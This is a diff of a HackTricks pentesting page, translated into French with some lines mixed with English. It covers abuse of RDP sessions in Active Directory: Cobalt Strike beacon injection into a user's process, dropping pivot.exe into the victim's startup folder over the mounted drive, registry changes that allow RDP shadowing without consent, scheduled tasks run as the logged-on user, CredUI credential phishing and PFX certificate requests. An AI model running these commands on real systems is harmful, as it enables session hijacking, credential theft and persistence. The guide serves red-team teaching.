@@ -1,12 +1,12 @@
-# RDP Sessions Abuse
+# Abus de sessions RDP
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Injection de Processus RDP
+## RDP Process Injection
 
-Si le **groupe externe** a un **accès RDP** à un **ordinateur** dans le domaine actuel, un **attaquant** pourrait **compromettre cet ordinateur et l'attendre**.
+Si le **groupe externe** a **accès RDP** à un **ordinateur** quelconque du domaine courant, un **attaquant** pourrait **compromettre cet ordinateur et attendre l'utilisateur**.
 
-Une fois que cet utilisateur a accédé via RDP, l'**attaquant peut pivoter vers la session de cet utilisateur** et abuser de ses permissions dans le domaine externe.
+Une fois que cet utilisateur s'est connecté via RDP, **l'attaquant peut pivoter vers la session de cet utilisateur** et abuser de ses autorisations dans le domaine externe.
 ```bash
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -30,13 +30,13 @@ PID   PPID  Name                         Arch  Session     User
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-Vérifiez **d'autres façons de voler des sessions avec d'autres outils** [**sur cette page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+Consultez **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-Si un utilisateur accède via **RDP à une machine** où un **attaquant** l'attend, l'attaquant pourra **injecter un beacon dans la session RDP de l'utilisateur** et si la **victime a monté son disque** en accédant via RDP, l'**attaquant pourrait y accéder**.
+Si un utilisateur se connecte via **RDP into a machine** où un **attacker** est **waiting** pour lui, l'**attacker** pourra **inject a beacon in the RDP session of the user**, et si la **victim mounted his drive** lors de l'accès via RDP, l'**attacker could access it**.
 
-Dans ce cas, vous pourriez simplement **compromettre** l'**ordinateur original** de la **victime** en écrivant une **backdoor** dans le **dossier de démarrage**.
+Dans ce cas vous pourriez simplement **compromise** le **victims** **original computer** en écrivant un **backdoor** dans le **statup folder**.
 ```bash
 # Wait til someone logs in:
 net logons
@@ -68,4 +68,90 @@ dir     10/18/2016 01:59:39   Documents and Settings
 beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 beacon> upload C:\Payloads\pivot.exe
 ```
+## Shadow RDP
+
+Si vous êtes **local admin** sur un hôte où la victime a déjà une **session RDP active**, vous pouvez être en mesure de **voir/contrôler ce bureau sans voler le mot de passe ni dumping LSASS**.
+
+Cela dépend de la politique **Remote Desktop Services shadowing** stockée dans :
+```text
+HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
+```
+Valeurs intéressantes :
+
+- `0`: Désactivé
+- `1`: `EnableInputNotify` (contrôle, approbation de l'utilisateur requise)
+- `2`: `EnableInputNoNotify` (contrôle, **aucune approbation de l'utilisateur**)
+- `3`: `EnableNoInputNotify` (en lecture seule, approbation de l'utilisateur requise)
+- `4`: `EnableNoInputNoNotify` (en lecture seule, **aucune approbation de l'utilisateur**)
+```cmd
+:: Check the policy
+reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow
+
+:: Enable interaction without consent
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f
+
+:: Enumerate sessions and shadow the target one
+quser /server:<HOST>
+mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
+```
+Ceci est particulièrement utile lorsqu'un utilisateur privilégié connecté via RDP a laissé un bureau déverrouillé, une session KeePass, une console MMC, une session de navigateur ou un admin shell ouvert.
+
+## Tâches planifiées en tant qu'utilisateur connecté
+
+Si vous êtes **local admin** et que l'utilisateur cible est **actuellement connecté**, Task Scheduler peut lancer du code **en tant que cet utilisateur sans son mot de passe**.
+
+Cela transforme la session de connexion existante de la victime en une primitive d'exécution :
+```cmd
+schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
+schtasks /run /S <HOST> /TN "Updater"
+```
+Remarques :
+
+- Si l'utilisateur **n'est pas connecté**, Windows exige généralement le mot de passe pour créer une tâche qui s'exécute en tant que lui.
+- Si l'utilisateur **est connecté**, la tâche peut réutiliser le contexte de connexion existant.
+- C'est une méthode pratique pour exécuter des actions GUI ou lancer des binaires dans la session de la victime sans toucher LSASS.
+
+## CredUI Prompt Abuse From the Victim Session
+
+Une fois que vous pouvez exécuter **dans le bureau interactif de la victime** (par exemple via **Shadow RDP** ou **une tâche planifiée s'exécutant en tant que cet utilisateur**), vous pouvez afficher une **vraie invite d'identifiants Windows** en utilisant les API CredUI et récolter les identifiants saisis par la victime.
+
+Relevant APIs:
+
+- `CredUIPromptForWindowsCredentials`
+- `CredUnPackAuthenticationBuffer`
+
+Typical flow:
+
+1. Lancer un binaire dans la session de la victime.
+2. Afficher une invite d'authentification de domaine dont l'apparence correspond au domaine courant.
+3. Dépaqueter l'auth buffer renvoyé.
+4. Valider les identifiants fournis et, si besoin, continuer d'afficher l'invite jusqu'à ce que des identifiants valides soient fournis.
+
+Ceci est utile pour le **on-host phishing** car l'invite est rendue par les API Windows standard au lieu d'un faux formulaire HTML.
+
+## Requesting a PFX In the Victim Context
+
+La même primitive **scheduled-task-as-user** peut être utilisée pour demander un **certificate/PFX en tant que la victime connectée**. Ce certificat peut ensuite être utilisé pour l'**authentification AD** en tant que cet utilisateur, évitant entièrement le vol de mot de passe.
+
+High-level flow:
+
+1. Obtenir **local admin** sur un hôte où la victime est connectée.
+2. Exécuter la logique d'enrollment/export en tant que la victime via une **tâche planifiée**.
+3. Exporter le **PFX** résultant.
+4. Utiliser le PFX pour PKINIT / authentification AD basée sur certificat.
+
+See the AD CS pages for follow-up abuse:
+
+{{#ref}}
+ad-certificates/account-persistence.md
+{{#endref}}
+
+## References
+
+- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
+- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
+- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
+- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
+- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
+
 {{#include ../../banners/hacktricks-training.md}}
